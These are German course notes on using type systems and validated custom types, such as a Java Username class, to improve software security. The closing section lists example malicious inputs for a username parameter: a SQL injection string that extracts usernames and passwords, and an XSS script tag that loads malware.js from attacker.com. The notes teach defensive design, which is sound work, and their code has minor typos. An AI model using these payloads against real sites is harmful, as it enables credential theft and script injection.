# SPRG 8 - Security with Types

## Type, type system and type checking

- Ein Typ ist eine Klassifizierung von Daten. Er definiert
  - Die bedeutung der Daten (Semantik)
  - Mögliche Werte der Daten
  - Die Operationen der Daten
- Type system ist eine Menge an Regeln, welche Typen für die Elemente eines Systems erzwingen (Variablen, Konstanten, Parameter, return types)
- Type Checking stellt sicher, dass die Regeln des type systems im Programm eingehaltet werden. Dies geschieht durch den type checker beim compilieren

## Classifications of type systems

- Dynamisches oder statisches System beim type checking
  - **Dynamic Typing**

    - Führt keinen type check durch beim compilieren

    - Compiler wirft keinen Fehler wenn z.B. folgende Operation im Code auftaucht:

      `x = "hello" + 3`

  - **Static Typing**

    - Prüft beim compilieren mit einem type check ob die typen korrekt verwendet werden

    - Compiler wirft also einen Fehler wenn z.B. folgende Operation im Code auftaucht:

      `x = "hello" + 3`

- Schwache (weak) oder starke (strong) typisierung
  - **Weak Type System**
    - Ein schwach typisiertes System konvertiert typen implizit falls dies nötig sit
  - **Strong Type System**
    - Ein stark typisiertes System wirft einen Fehler wenn bei einer Operation die Typen nicht gleich sind



## Custom Types

- Integer, Double, BigDecimal, Char, String usw. werden auch als "primitive" Datentypen bezeichnet

- In einer gegebenen business domain arbeiten wir allerdings with strikteren Werten:

  - Username ist ein String, aber...

    - Er darf mindestens 3 und maximal 33 Zeichen lang sein
    - und er darf nur Zeichen aus dem Alphabet beeinhalten (also keine Satzzeichen, Schrägstriche usw.)

  - Menge an Übertragenem Geld ist ein BigDecimal, aber...

    - der Wert muss grösser als 0 sein
    - Je nach Währung darf der Betrag maximal 2 Zeichen nach dem Komma betragen

  - Ein Custom Type für den Benutzername könnte so aussehen:

    ```java
    public class Username
    {
        // Wert des Usernamens
        private final String value;
        
        // Konstruktur, welcher den String validiert
        public Username(String username)
        {
            // Prüfen, ob Username mitgegeben wurde
        	if(username == null || username.length == 0)
            {
                throw new ValidationException("Username is required")
            }
            
            /*
            * Weitere Prüfungen für den Usernamen
            */
            
            this.value = username;
        }
    }
    ```

## Wie können Typen die Sicherheit verbessern?

- Angenommen es gibt die Webseite
  - `internal.bankintra.com/showprofile?username={USERNAME}`
  - Wenn `{USERNAME}` ein Sring ist, so kann er unter anderem folgende arten von Werten annehmen:
    - Einen validen Usernamen
      - z.B.: `RaphiDerHeld69`
    - Schädlichen Code für SQL injection
      - z.B.: `' UNION SELECT username, password FROM users --`
    - Schädlichen Code für XSS um JavaScript in die Profileseite zu schmuggeln
      - z.B.: `<script src='http://attacker.com/malware.js />'`$
  - 

